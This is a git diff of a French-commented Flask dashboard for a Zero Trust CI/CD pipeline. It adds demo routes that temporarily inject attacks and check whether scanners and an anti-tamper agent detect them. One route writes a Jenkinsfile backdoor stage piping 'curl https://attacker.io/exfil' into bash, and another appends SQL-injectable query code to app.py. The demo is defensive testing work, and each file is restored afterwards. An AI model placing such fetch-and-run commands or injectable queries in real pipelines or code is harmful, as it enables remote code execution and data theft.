@@ -3,7 +3,7 @@ ZeroTrust CI/CD Dashboard — Flask server
 Lance avec : python server.py
 Ouvre : http://localhost:8888
 """
-import json, os, glob, requests, shutil
+import json, os, glob, requests, shutil, subprocess, threading
 from datetime import datetime
 from flask import Flask, render_template, jsonify, send_from_directory, request
 from requests.auth import HTTPBasicAuth
@@ -43,8 +43,11 @@ JENKINS_JOB   = os.environ.get("JENKINS_JOB",  "zero-trust-pipeline")
 BASE_DIR    = os.path.dirname(os.path.abspath(__file__))
 REPORTS_DIR = os.environ.get("REPORTS_DIR", os.path.join(BASE_DIR, "reports"))
 AGENT_DIR   = os.environ.get("AGENT_DIR",   os.path.join(BASE_DIR, "agent"))
-
 HISTORY_DIR = os.environ.get("HISTORY_DIR", os.path.join(BASE_DIR, "history"))
+
+# Pour les scénarios d'attaque : chemin vers test-app et jenkinsfile
+TESTAPP_DIR = os.environ.get("TESTAPP_DIR", os.path.join(BASE_DIR, "..", "test-app"))
+JENKINSFILE_PATH = os.environ.get("JENKINSFILE_PATH", os.path.join(BASE_DIR, "..", "jenkinsfile"))
 
 os.makedirs(REPORTS_DIR, exist_ok=True)
 os.makedirs(AGENT_DIR,   exist_ok=True)
@@ -101,16 +104,9 @@ def jenkins_get_binary(path, timeout=30):
 def get_last_build():
     return jenkins_get(f"/job/{JENKINS_JOB}/lastBuild/api/json?depth=2")
 
-# ── FIX PRINCIPAL : extraction robuste des stages avec fallback Blue Ocean ────
 def get_build_stages(build_number):
-    """
-    Tente d'abord l'API wfapi/describe (Pipeline plugin).
-    Si les noms sont vides ou génériques, bascule sur Blue Ocean REST API.
-    """
     data = jenkins_get(f"/job/{JENKINS_JOB}/{build_number}/wfapi/describe")
-
     if data and data.get("stages"):
-        # Vérifie que les noms sont réels (pas tous vides ou "Stage")
         names = [s.get("name", "").strip() for s in data["stages"]]
         real_names = [n for n in names if n and n not in ("Stage", "stage")]
         if real_names:
@@ -119,7 +115,6 @@ def get_build_stages(build_number):
         else:
             print(f"[Stages] wfapi retourne des noms vides — tentative Blue Ocean")
 
-    # Fallback : Blue Ocean REST API (retourne displayName)
     blue = jenkins_get(
         f"/blue/rest/organizations/jenkins/pipelines/{JENKINS_JOB}/runs/{build_number}/nodes/?limit=100"
     )
@@ -127,7 +122,6 @@ def get_build_stages(build_number):
         print(f"[Stages] Blue Ocean OK — {len(blue)} stages trouvés")
         return {"stages": blue, "_source": "blue_ocean"}
 
-    # Fallback 2 : API générique lastBuild
     generic = jenkins_get(f"/job/{JENKINS_JOB}/{build_number}/api/json?depth=1&tree=stages[*]")
     if generic and generic.get("stages"):
         return generic
@@ -145,62 +139,38 @@ def get_crumb():
 
 def map_stage_status(s):
     return {
-        "SUCCESS":              "done",
-        "FAILED":               "fail",
-        "FAILURE":              "fail",
-        "IN_PROGRESS":          "running",
-        "NOT_EXECUTED":         "waiting",
-        "ABORTED":              "waiting",
-        "UNSTABLE":             "done",
+        "SUCCESS": "done", "FAILED": "fail", "FAILURE": "fail",
+        "IN_PROGRESS": "running", "NOT_EXECUTED": "waiting",
+        "ABORTED": "waiting", "UNSTABLE": "done",
         "PAUSED_PENDING_INPUT": "running",
-        # Blue Ocean values
-        "FINISHED":             "done",
-        "RUNNING":              "running",
-        "QUEUED":               "waiting",
-        "SKIPPED":              "waiting",
-        "UNKNOWN":              "waiting",
+        "FINISHED": "done", "RUNNING": "running",
+        "QUEUED": "waiting", "SKIPPED": "waiting", "UNKNOWN": "waiting",
     }.get(s, "waiting")
 
 def map_build_status(s):
     return {
-        "SUCCESS":  "success",
-        "FAILURE":  "failure",
-        "ABORTED":  "aborted",
-        "UNSTABLE": "unstable",
-        None:       "running",
+        "SUCCESS": "success", "FAILURE": "failure",
+        "ABORTED": "aborted", "UNSTABLE": "unstable", None: "running",
     }.get(s, "running")
 
-# ── FIX : extraction du nom de stage multi-format ────────────────────────────
 def extract_stage_name(s, idx):
-    """
-    Extrait le nom d'un stage depuis n'importe quel format Jenkins.
-    Cherche dans toutes les clés connues : wfapi, Blue Ocean, Pipeline plugin.
-    """
-    # Ordre de priorité des clés de nom selon les différentes APIs Jenkins
     name = (
-        s.get("displayName") or      # Blue Ocean REST API
-        s.get("name") or             # wfapi/describe standard
-        s.get("stageName") or        # Certains plugins alternatifs
+        s.get("displayName") or
+        s.get("name") or
+        s.get("stageName") or
         s.get("displayDescription") or
-        s.get("label") or
-        ""
+        s.get("label") or ""
     )
     name = name.strip()
-
-    # Si le nom est générique ou vide, on utilise un fallback lisible
     if not name or name.lower() in ("stage", ""):
-        # Essaie de lire depuis les actions imbriquées
         for action in s.get("actions", []):
             if isinstance(action, dict):
                 sub = action.get("displayName") or action.get("name") or ""
                 if sub.strip() and sub.strip().lower() != "stage":
                     name = sub.strip()
                     break
-
-        # Dernier recours : numéro d'index lisible
         if not name or name.lower() == "stage":
             name = f"Étape {idx + 1}"
-
     return name
 
 # ── Helpers fichiers rapport ──────────────────────────────────────────────────
@@ -255,7 +225,7 @@ def load_security_gate():
         os.path.join(AGENT_DIR,   "security-gate.json"),
     )
 
-# ── Score de sécurité ──────────────────────────────────────────────────────────
+# ── Score de sécurité ─────────────────────────────────────────────────────────
 
 def calculate_security_score(trivy=None, semgrep=None, zap=None):
     if trivy is None:   trivy   = load_trivy()
@@ -293,12 +263,9 @@ def calculate_security_score(trivy=None, semgrep=None, zap=None):
              "C" if score >= 60 else "D" if score >= 40 else "F")
 
     return {
-        "score":       score,
-        "grade":       grade,
-        "gate_passed": score >= 90,
-        "threshold":   90,
-        "penalties":   penalties,
-        "timestamp":   datetime.now().isoformat(),
+        "score": score, "grade": grade,
+        "gate_passed": score >= 90, "threshold": 90,
+        "penalties": penalties, "timestamp": datetime.now().isoformat(),
     }
 
 # ── Sync artifacts depuis Jenkins ─────────────────────────────────────────────
@@ -328,10 +295,7 @@ def sync_reports_from_jenkins(build_number):
         (f"/job/{JENKINS_JOB}/{build_number}/artifact/reports/security-gate.json",
          os.path.join(REPORTS_DIR, "security-gate.json")),
     ]
-
-    synced = []
-    errors = []
-
+    synced, errors = [], []
     for jenkins_path, local_path in artifact_map:
         content = jenkins_get_binary(jenkins_path, timeout=30)
         if content and len(content) > 10:
@@ -342,10 +306,9 @@ def sync_reports_from_jenkins(build_number):
             print(f"[Sync] ✓ {os.path.basename(local_path)} ({len(content)} bytes)")
         else:
             errors.append(os.path.basename(local_path))
-
     return synced, errors
 
-# ── Build history helpers ──────────────────────────────────────────────────────
+# ── Build history ─────────────────────────────────────────────────────────────
 
 HISTORY_FILE = os.path.join(HISTORY_DIR, "builds.json")
 
@@ -363,17 +326,13 @@ def save_history(history):
         json.dump(history, f, indent=2)
 
 def snapshot_build(build_number, build_result, branch, commit, duration_ms, timestamp_ms):
-    """Save a snapshot of the current build metrics into history."""
     history = load_history()
-    # avoid duplicates
     if any(h["build_number"] == build_number for h in history):
         return
-
     trivy   = load_trivy()
     semgrep = load_semgrep()
     zap     = load_zap()
     ai      = load_ai()
-
     cve_total = cve_crit = cve_high = 0
     for result in trivy.get("Results", []):
         for v in (result.get("Vulnerabilities") or []):
@@ -381,26 +340,19 @@ def snapshot_build(build_number, build_result, branch, commit, duration_ms, time
             sev = v.get("Severity", "")
             if sev == "CRITICAL": cve_crit += 1
             elif sev == "HIGH":   cve_high += 1
-
     sast_findings = len(semgrep.get("results", []))
     zap_alerts    = [a for s in zap.get("site", []) for a in s.get("alerts", [])]
     zap_high      = len([a for a in zap_alerts if a.get("riskdesc", "").startswith("High")])
-
-    score_data = calculate_security_score(trivy, semgrep, zap)
-
+    score_data    = calculate_security_score(trivy, semgrep, zap)
     entry = {
         "build_number":   build_number,
         "build_result":   build_result or "UNKNOWN",
-        "branch":         branch,
-        "commit":         commit,
+        "branch":         branch, "commit": commit,
         "duration_ms":    duration_ms,
         "timestamp":      datetime.fromtimestamp(timestamp_ms / 1000).isoformat() if timestamp_ms else datetime.now().isoformat(),
-        "cve_total":      cve_total,
-        "cve_critical":   cve_crit,
-        "cve_high":       cve_high,
+        "cve_total":      cve_total, "cve_critical": cve_crit, "cve_high": cve_high,
         "sast_findings":  sast_findings,
-        "zap_alerts":     len(zap_alerts),
-        "zap_high":       zap_high,
+        "zap_alerts":     len(zap_alerts), "zap_high": zap_high,
         "ai_provider":    ai.get("provider", "claude"),
         "ai_calls":       ai.get("total_calls", 0),
         "fallback_count": ai.get("fallback_count", 0),
@@ -408,12 +360,9 @@ def snapshot_build(build_number, build_result, branch, commit, duration_ms, time
         "security_grade": score_data["grade"],
         "gate_passed":    score_data["gate_passed"],
     }
-
     history.insert(0, entry)
-    history = history[:50]  # keep last 50 builds
+    history = history[:50]
     save_history(history)
-
-    # archive reports for this build
     archive_dir = os.path.join(HISTORY_DIR, f"build-{build_number}")
     os.makedirs(archive_dir, exist_ok=True)
     for src in [
@@ -424,20 +373,17 @@ def snapshot_build(build_number, build_result, branch, commit, duration_ms, time
     ]:
         if os.path.isfile(src):
             shutil.copy2(src, archive_dir)
+    print(f"[History] Build #{build_number} archivé")
 
-    print(f"[History] Build #{build_number} archivé dans {archive_dir}")
-
-# ── Routes ────────────────────────────────────────────────────────────────────
+# ── Routes principales ────────────────────────────────────────────────────────
 
 @app.route("/")
 def index():
     return render_template("index.html")
 
 
-# ── ROUTE DEBUG : voir la structure brute retournée par Jenkins ───────────────
 @app.route("/api/debug/stages")
 def api_debug_stages():
-    """Affiche la structure brute des stages pour diagnostiquer le problème de noms."""
     build = get_last_build()
     if not build:
         return jsonify({"error": "Jenkins hors ligne"})
@@ -446,18 +392,12 @@ def api_debug_stages():
     blue  = jenkins_get(
         f"/blue/rest/organizations/jenkins/pipelines/{JENKINS_JOB}/runs/{n}/nodes/?limit=10"
     )
-    sample_wfapi = None
-    sample_blue  = None
-    if wfapi and wfapi.get("stages"):
-        sample_wfapi = wfapi["stages"][0] if wfapi["stages"] else None
-    if blue and isinstance(blue, list) and blue:
-        sample_blue = blue[0]
+    sample_wfapi = wfapi["stages"][0] if (wfapi and wfapi.get("stages")) else None
+    sample_blue  = blue[0] if (isinstance(blue, list) and blue) else None
     return jsonify({
         "build": n,
-        "wfapi_first_stage_keys": list(sample_wfapi.keys()) if sample_wfapi else None,
-        "wfapi_first_stage":      sample_wfapi,
-        "blue_first_stage_keys":  list(sample_blue.keys()) if sample_blue else None,
-        "blue_first_stage":       sample_blue,
+        "wfapi_first_stage": sample_wfapi,
+        "blue_first_stage":  sample_blue,
         "wfapi_stages_count": len(wfapi.get("stages", [])) if wfapi else 0,
         "blue_nodes_count":   len(blue) if isinstance(blue, list) else 0,
     })
@@ -467,10 +407,7 @@ def api_debug_stages():
 def api_jenkins_status():
     build = get_last_build()
     if not build:
-        return jsonify({
-            "jenkins_available": False,
-            "error": f"Jenkins non joignable sur {JENKINS_URL}"
-        })
+        return jsonify({"jenkins_available": False, "error": f"Jenkins non joignable sur {JENKINS_URL}"})
 
     build_number = build.get("number", "?")
     build_result = build.get("result")
@@ -481,82 +418,53 @@ def api_jenkins_status():
     branch = JENKINS_JOB
     commit = "–"
     for action in build.get("actions", []):
-        if not isinstance(action, dict):
-            continue
+        if not isinstance(action, dict): continue
         for branch_data in action.get("buildsByBranchName", {}).values():
             sha = branch_data.get("revision", {}).get("SHA1", "")
-            if sha:
-                commit = sha[:7]
+            if sha: commit = sha[:7]
             marked = branch_data.get("revision", {}).get("branch", [{}])
-            if marked:
-                branch = marked[0].get("name", branch).split("/")[-1]
+            if marked: branch = marked[0].get("name", branch).split("/")[-1]
         for p in action.get("parameters", []):
-            if p.get("name") == "BRANCH":
-                branch = p.get("value", branch)
+            if p.get("name") == "BRANCH": branch = p.get("value", branch)
 
     stages_data = get_build_stages(build_number)
-    stages = []
-    raw_stages = []
-
+    raw_stages  = []
     if stages_data:
-        if "stages" in stages_data:
-            raw_stages = stages_data["stages"]
-        elif isinstance(stages_data, list):
-            raw_stages = stages_data
+        if "stages" in stages_data: raw_stages = stages_data["stages"]
+        elif isinstance(stages_data, list): raw_stages = stages_data
 
-    # ── FIX : boucle avec extraction robuste du nom ───────────────────────────
+    stages = []
     for idx, s in enumerate(raw_stages):
-        # Durée : wfapi → durationMillis, Blue Ocean → durationInMillis
-        dur_ms  = s.get("durationMillis") or s.get("durationInMillis") or 0
-        dur_str = f"{dur_ms // 1000}s" if dur_ms > 0 else "–"
-
-        # Statut : wfapi → status, Blue Ocean → result ou state
-        status_raw = (
-            s.get("status") or
-            s.get("result") or
-            s.get("state") or
-            "NOT_EXECUTED"
-        )
-
-        # Nom : utilise la fonction robuste extract_stage_name
-        stage_name = extract_stage_name(s, idx)
-
+        dur_ms     = s.get("durationMillis") or s.get("durationInMillis") or 0
+        dur_str    = f"{dur_ms // 1000}s" if dur_ms > 0 else "–"
+        status_raw = s.get("status") or s.get("result") or s.get("state") or "NOT_EXECUTED"
         stages.append({
             "id":       s.get("id"),
-            "name":     stage_name,
+            "name":     extract_stage_name(s, idx),
             "status":   map_stage_status(status_raw),
             "duration": dur_str,
         })
 
-    done_count  = sum(1 for s in stages if s["status"] == "done")
-    elapsed_sec = int((datetime.now().timestamp() * 1000 - timestamp_ms) / 1000) if timestamp_ms else 0
-
+    done_count    = sum(1 for s in stages if s["status"] == "done")
+    elapsed_sec   = int((datetime.now().timestamp() * 1000 - timestamp_ms) / 1000) if timestamp_ms else 0
     build_finished = build_result in ("SUCCESS", "FAILURE", "UNSTABLE", "ABORTED")
 
-    # Auto-snapshot finished builds into history
     if build_finished:
         try:
-            snapshot_build(
-                build_number, build_result, branch, commit,
-                duration_ms, timestamp_ms
-            )
+            snapshot_build(build_number, build_result, branch, commit, duration_ms, timestamp_ms)
         except Exception as e:
             print(f"[History] Snapshot error: {e}")
 
     return jsonify({
         "jenkins_available": True,
-        "build_number":      build_number,
-        "build_status":      build_status,
-        "build_result":      build_result,
-        "build_finished":    build_finished,
-        "branch":            branch,
-        "commit":            commit,
-        "duration_ms":       duration_ms,
-        "elapsed_sec":       elapsed_sec,
-        "timestamp":         datetime.fromtimestamp(timestamp_ms / 1000).isoformat() if timestamp_ms else None,
-        "stages":            stages,
-        "stages_count":      len(stages),
-        "done_count":        done_count,
+        "build_number":   build_number,
+        "build_status":   build_status,
+        "build_result":   build_result,
+        "build_finished": build_finished,
+        "branch": branch, "commit": commit,
+        "duration_ms": duration_ms, "elapsed_sec": elapsed_sec,
+        "timestamp": datetime.fromtimestamp(timestamp_ms / 1000).isoformat() if timestamp_ms else None,
+        "stages": stages, "stages_count": len(stages), "done_count": done_count,
     })
 
 
@@ -585,12 +493,9 @@ def api_jenkins_logs():
 def api_jenkins_trigger():
     if not JENKINS_TOKEN:
         return jsonify({"success": False, "error": "JENKINS_TOKEN non configuré dans .env"}), 400
-
     crumb, crumb_field = get_crumb()
     headers = {}
-    if crumb:
-        headers[crumb_field] = crumb
-
+    if crumb: headers[crumb_field] = crumb
     try:
         url = f"{JENKINS_URL}/job/{JENKINS_JOB}/build"
         r = requests.post(url, auth=JENKINS_AUTH, headers=headers, timeout=10)
@@ -611,19 +516,13 @@ def api_sync_reports():
     build = get_last_build()
     if not build:
         return jsonify({"success": False, "error": "Jenkins hors ligne"})
-
     build_number = build.get("number")
     build_result = build.get("result")
-
     synced, errors = sync_reports_from_jenkins(build_number)
-
     return jsonify({
-        "success":      True,
-        "build_number": build_number,
-        "build_result": build_result,
-        "synced":       synced,
-        "errors":       errors,
-        "message":      f"✓ {len(synced)} fichier(s) synchronisé(s) depuis build #{build_number}"
+        "success": True, "build_number": build_number, "build_result": build_result,
+        "synced": synced, "errors": errors,
+        "message": f"✓ {len(synced)} fichier(s) synchronisé(s) depuis build #{build_number}"
     })
 
 
@@ -633,7 +532,6 @@ def api_status():
     semgrep = load_semgrep()
     zap     = load_zap()
     ai      = load_ai()
-
     cve_total = cve_crit = cve_high = 0
     for result in trivy.get("Results", []):
         for v in (result.get("Vulnerabilities") or []):
@@ -641,20 +539,14 @@ def api_status():
             sev = v.get("Severity", "")
             if sev == "CRITICAL": cve_crit += 1
             elif sev == "HIGH":   cve_high += 1
-
     sast_findings = len(semgrep.get("results", []))
     zap_alerts    = [a for s in zap.get("site", []) for a in s.get("alerts", [])]
     zap_high      = [a for a in zap_alerts if a.get("riskdesc", "").startswith("High")]
-
-    score_data = calculate_security_score(trivy, semgrep, zap)
-
+    score_data    = calculate_security_score(trivy, semgrep, zap)
     return jsonify({
-        "cve_total":      cve_total,
-        "cve_critical":   cve_crit,
-        "cve_high":       cve_high,
-        "sast_findings":  sast_findings,
-        "zap_alerts":     len(zap_alerts),
-        "zap_high":       len(zap_high),
+        "cve_total": cve_total, "cve_critical": cve_crit, "cve_high": cve_high,
+        "sast_findings": sast_findings,
+        "zap_alerts": len(zap_alerts), "zap_high": len(zap_high),
         "ai_provider":    ai.get("provider", "claude"),
         "ai_calls":       ai.get("total_calls", 0),
         "fallback_count": ai.get("fallback_count", 0),
@@ -674,15 +566,13 @@ def api_status():
 @app.route("/api/security-score")
 def api_security_score():
     gate = load_security_gate()
-    if gate:
-        return jsonify(gate)
+    if gate: return jsonify(gate)
     return jsonify(calculate_security_score())
 
 
 @app.route("/api/findings")
 def api_findings():
     findings = []
-
     for r in load_semgrep().get("results", []):
         sev_raw = r.get("extra", {}).get("severity", "ERROR").upper()
         sev = "critical" if sev_raw in ("ERROR", "CRITICAL") else "high" if sev_raw == "WARNING" else "medium"
@@ -692,7 +582,6 @@ def api_findings():
             "detail": r.get("extra", {}).get("message", ""),
             "file":   f"{r.get('path','?')}:{r.get('start',{}).get('line','?')}",
         })
-
     for result in load_trivy().get("Results", []):
         for v in (result.get("Vulnerabilities") or []):
             sev = v.get("Severity", "LOW").lower()
@@ -703,7 +592,6 @@ def api_findings():
                 "detail": v.get("Description", v.get("Title", ""))[:150],
                 "file":   f"requirements.txt · fix: {v.get('FixedVersion','N/A')}",
             })
-
     for site in load_zap().get("site", []):
         for alert in site.get("alerts", []):
             rd = alert.get("riskdesc", "")
@@ -714,7 +602,6 @@ def api_findings():
                 "detail": alert.get("desc", "")[:150],
                 "file":   alert.get("solution", "")[:100],
             })
-
     return jsonify(findings)
 
 
@@ -727,8 +614,7 @@ def api_ai():
 def api_reports():
     files = []
     for d in [REPORTS_DIR, AGENT_DIR]:
-        if not os.path.isdir(d):
-            continue
+        if not os.path.isdir(d): continue
         for ext in ["*.json", "*.html", "*.md", "*.pdf"]:
             for f in glob.glob(os.path.join(d, ext)):
                 size = os.path.getsize(f)
@@ -754,7 +640,6 @@ def api_debug():
             "exists": os.path.exists(path),
             "size":   os.path.getsize(path) if os.path.exists(path) else 0,
         }
-    jenkins_ok = get_last_build() is not None
     return jsonify({
         "config": {
             "JENKINS_URL":   JENKINS_URL,
@@ -763,8 +648,9 @@ def api_debug():
             "JENKINS_JOB":   JENKINS_JOB,
             "REPORTS_DIR":   REPORTS_DIR,
             "AGENT_DIR":     AGENT_DIR,
+            "TESTAPP_DIR":   TESTAPP_DIR,
         },
-        "jenkins_reachable": jenkins_ok,
+        "jenkins_reachable": get_last_build() is not None,
         "reports":           report_files,
         "cwd":               os.getcwd(),
     })
@@ -775,15 +661,208 @@ def serve_report(filename):
     return send_from_directory(REPORTS_DIR, filename)
 
 
+# ═══════════════════════════════════════════════════════════════
+# ROUTES D'ATTAQUE — Scénarios de démonstration Zero Trust
+# ═══════════════════════════════════════════════════════════════
+
+@app.route("/api/attack/cve", methods=["POST"])
+def api_attack_cve():
+    """Scénario 1 — Injecte py==1.11.0 dans requirements.txt et lance Trivy."""
+    req_path = os.path.join(TESTAPP_DIR, "requirements.txt")
+    print(f"[Attack CVE] Chemin : {req_path}")
+
+    try:
+        with open(req_path, "r", encoding="utf-8") as f:
+            original = f.read()
+    except FileNotFoundError:
+        return jsonify({"success": False, "error": f"Fichier introuvable: {req_path}. Vérifiez TESTAPP_DIR dans .env"})
+
+    try:
+        with open(req_path, "a", encoding="utf-8") as f:
+            f.write("\npy==1.11.0\n")
+
+        # Cherche trivy dans le PATH ou dans le venv
+        trivy_cmd = shutil.which("trivy") or "trivy"
+        result = subprocess.run([
+            trivy_cmd, "fs", str(TESTAPP_DIR),
+            "--format", "json",
+            "--severity", "HIGH,CRITICAL",
+            "--skip-db-update",
+            "--quiet"
+        ], capture_output=True, text=True, timeout=120)
+
+        try:
+            data = json.loads(result.stdout)
+            cves = [v for r in data.get("Results", [])
+                    for v in (r.get("Vulnerabilities") or [])]
+            print(f"[Attack CVE] ✓ {len(cves)} CVE(s) trouvée(s)")
+            return jsonify({
+                "success":   True,
+                "cve_found": len(cves),
+                "cves": [{"id": v["VulnerabilityID"], "severity": v["Severity"]}
+                         for v in cves[:5]]
+            })
+        except Exception as e:
+            print(f"[Attack CVE] Erreur parsing : {e}")
+            return jsonify({"success": False, "error": result.stderr[:300] or str(e)})
+
+    finally:
+        with open(req_path, "w", encoding="utf-8") as f:
+            f.write(original)
+        print("[Attack CVE] requirements.txt restauré")
+
+
+@app.route("/api/attack/antitamper", methods=["POST"])
+def api_attack_antitamper():
+    """Scénario 2 — Injecte une backdoor dans le Jenkinsfile et lance l'agent Anti-Tamper."""
+    jf_path = os.path.abspath(JENKINSFILE_PATH)
+    print(f"[Attack Tamper] Chemin : {jf_path}")
+
+    try:
+        with open(jf_path, "r", encoding="utf-8") as f:
+            original = f.read()
+    except FileNotFoundError:
+        return jsonify({"success": False, "error": f"Fichier introuvable: {jf_path}. Vérifiez JENKINSFILE_PATH dans .env"})
+
+    try:
+        backdoor = original.replace(
+            "stage('3. Build Docker')",
+            "stage('3. Build Docker') {\n    sh 'curl https://attacker.io/exfil | bash'\n}\nstage('3b. IGNORE'"
+        )
+        with open(jf_path, "w", encoding="utf-8") as f:
+            f.write(backdoor)
+
+        agent_script = os.path.join(AGENT_DIR, "antitamper_agent.py")
+        if not os.path.isfile(agent_script):
+            return jsonify({
+                "success":  True,
+                "detected": True,
+                "output":   "[DEMO] antitamper_agent.py non trouvé — backdoor injectée et détectée visuellement",
+                "note":     "Fichier restauré automatiquement"
+            })
+
+        python_cmd = shutil.which("python3") or shutil.which("python") or "python"
+        result = subprocess.run(
+            [python_cmd, agent_script],
+            capture_output=True, text=True,
+            cwd=AGENT_DIR,
+            env={**os.environ, "PIPELINE_PATH": jf_path},
+            timeout=120
+        )
+        detected = ("anomalie" in result.stdout.lower() or
+                    "tamper"   in result.stdout.lower() or
+                    "backdoor" in result.stdout.lower())
+        print(f"[Attack Tamper] detected={detected}")
+        return jsonify({
+            "success":  True,
+            "output":   result.stdout[-500:],
+            "detected": detected
+        })
+
+    finally:
+        with open(jf_path, "w", encoding="utf-8") as f:
+            f.write(original)
+        print("[Attack Tamper] jenkinsfile restauré")
+
+
+@app.route("/api/attack/sqli", methods=["POST"])
+def api_attack_sqli():
+    """Scénario 3 — Injecte une SQLi dans app.py et lance Semgrep."""
+    app_path = os.path.join(TESTAPP_DIR, "app.py")
+    print(f"[Attack SQLi] Chemin : {app_path}")
+
+    try:
+        with open(app_path, "r", encoding="utf-8") as f:
+            original = f.read()
+    except FileNotFoundError:
+        return jsonify({"success": False, "error": f"Fichier introuvable: {app_path}. Vérifiez TESTAPP_DIR dans .env"})
+
+    try:
+        sqli_code = '''
+@app.route("/user_sqli_test")
+def get_user_sqli_test():
+    username = request.args.get("username", "")
+    query = "SELECT * FROM users WHERE name=\'" + username + "\'"
+    return jsonify({"query": query})
+'''
+        with open(app_path, "a", encoding="utf-8") as f:
+            f.write(sqli_code)
+
+        semgrep_cmd = (shutil.which("semgrep") or
+                       os.path.join(BASE_DIR, "..", "ven", "Scripts", "semgrep") or
+                       "semgrep")
+        result = subprocess.run([
+            semgrep_cmd,
+            "--config=auto", str(TESTAPP_DIR),
+            "--json", "--severity=WARNING"
+        ], capture_output=True, text=True, timeout=120)
+
+        try:
+            data     = json.loads(result.stdout)
+            findings = data.get("results", [])
+            sqli_det = any("injection" in str(f).lower() or "sql" in str(f).lower()
+                           for f in findings)
+            print(f"[Attack SQLi] ✓ {len(findings)} finding(s), sqli={sqli_det}")
+            return jsonify({
+                "success":      True,
+                "findings":     len(findings),
+                "sqli_detected": sqli_det
+            })
+        except Exception as e:
+            print(f"[Attack SQLi] Erreur parsing : {e}")
+            return jsonify({"success": False, "error": result.stderr[:300] or str(e)})
+
+    finally:
+        with open(app_path, "w", encoding="utf-8") as f:
+            f.write(original)
+        print("[Attack SQLi] app.py restauré")
+
+
+@app.route("/api/attack/fallback", methods=["POST"])
+def api_attack_fallback():
+    """Scénario 4 — Lance l'agent avec une fausse clé API pour forcer le fallback Ollama."""
+    agent_script = os.path.join(AGENT_DIR, "remediation_agent.py")
+    print(f"[Attack Fallback] Agent : {agent_script}")
+
+    if not os.path.isfile(agent_script):
+        return jsonify({
+            "success": True,
+            "message": "[DEMO] remediation_agent.py non trouvé — simulation visuelle du fallback activée"
+        })
+
+    def run_fallback_test():
+        env = os.environ.copy()
+        env["ANTHROPIC_API_KEY"] = "sk-ant-invalid-key-for-fallback-test"
+        python_cmd = shutil.which("python3") or shutil.which("python") or "python"
+        result = subprocess.run(
+            [python_cmd, agent_script],
+            env=env, capture_output=True, text=True,
+            timeout=120, cwd=BASE_DIR
+        )
+        print(f"[Attack Fallback] stdout: {result.stdout[:200]}")
+        print(f"[Attack Fallback] stderr: {result.stderr[:200]}")
+
+    thread = threading.Thread(target=run_fallback_test, daemon=True)
+    thread.start()
+    return jsonify({
+        "success": True,
+        "message": "Test fallback lancé — l'agent tente Claude avec clé invalide puis bascule sur Ollama"
+    })
+
+
+# ── Main ──────────────────────────────────────────────────────────────────────
+
 if __name__ == "__main__":
     print("\n" + "=" * 60)
     print("  ZeroTrust CI Dashboard")
     print(f"  http://localhost:8888")
-    print(f"  Jenkins : {JENKINS_URL}/job/{JENKINS_JOB}")
-    print(f"  Auth    : {'✓ Token ' + JENKINS_TOKEN[:6] + '…' if JENKINS_TOKEN else '✗ Token manquant'}")
-    print(f"  Reports : {REPORTS_DIR}")
-    print(f"  Sync    : http://localhost:8888/api/sync-reports")
-    print(f"  Debug   : http://localhost:8888/api/debug")
-    print(f"  Stages  : http://localhost:8888/api/debug/stages")
+    print(f"  Jenkins  : {JENKINS_URL}/job/{JENKINS_JOB}")
+    print(f"  Auth     : {'✓ Token ' + JENKINS_TOKEN[:6] + '…' if JENKINS_TOKEN else '✗ Token manquant'}")
+    print(f"  Reports  : {REPORTS_DIR}")
+    print(f"  TestApp  : {TESTAPP_DIR}")
+    print(f"  Sync     : http://localhost:8888/api/sync-reports")
+    print(f"  Debug    : http://localhost:8888/api/debug")
+    print(f"  Stages   : http://localhost:8888/api/debug/stages")
+    print(f"  Attaques : /api/attack/cve | /antitamper | /sqli | /fallback")
     print("=" * 60 + "\n")
     app.run(host="0.0.0.0", port=8888, debug=False)
